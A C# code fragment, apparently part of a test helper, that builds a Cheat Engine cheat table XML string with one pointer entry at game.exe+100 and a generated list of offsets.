        sb.Append("<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"DeepPtr\"</Description><Address>game.exe+100</Address><VariableType>4 Bytes</VariableType><Offsets>");
        for (int i = 0; i < offsetCount; i++)
        {
            sb.Append(CultureInfo.InvariantCulture, $"<Offset>{i * 4:X}</Offset>");
        }
        sb.Append("</Offsets></CheatEntry></CheatEntries></CheatTable>");
        return sb.ToString();
    }
}
